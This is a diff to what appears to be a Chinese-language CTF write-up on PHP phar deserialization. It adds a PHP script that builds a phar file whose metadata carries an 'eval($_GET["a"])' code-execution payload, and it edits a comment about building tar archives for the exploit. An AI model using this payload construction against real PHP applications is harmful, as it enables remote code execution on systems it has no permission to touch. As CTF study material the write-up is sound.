@@ -117,6 +117,26 @@ https://www.anquanke.com/post/id/240007
 > tar
 > zip
 
+php生成phar
+```php
+<?php
+class Testobj
+{
+  var $output='';
+}
+
+@unlink('test.phar');   //删除之前的test.par文件(如果有)
+$phar=new Phar('test.phar');  //创建一个phar对象，文件名必须以phar为后缀
+$phar->startBuffering();  //开始写文件
+$phar->setStub('<?php __HALT_COMPILER(); ?>');  //写入stub
+$o=new Testobj();  
+$o->output='eval($_GET["a"]);';  
+$phar->setMetadata($o);//写入meta-data
+$phar->addFromString("test.txt","test");  //添加要压缩的文件
+$phar->stopBuffering();
+?>
+```
+
 ## 第三关 `throw new Error('那么就从这里开始吧');`
 
 https://www.php.net/manual/zh/phar.fileformat.php
@@ -248,7 +268,7 @@ import requests
 
 def make_tarfile(output_filename, source_dir):
     os.system(f'tar -cf app.tar {source_dir}')
-    # with tarfile.open(output_filename, "w:gz") as tar:   # 打ctf用system或py2压tar, py3压的tar打不通, 而且py2压的没明文，不需要再加成gzip
+    # with tarfile.open(output_filename, "w:gz") as tar:   # 打ctf用system或py2/python2压tar, py3压的tar打不通, 而且py2压的没明文，不需要再加成gzip
     #     tar.add(source_dir, arcname=os.path.basename(source_dir))
 
 
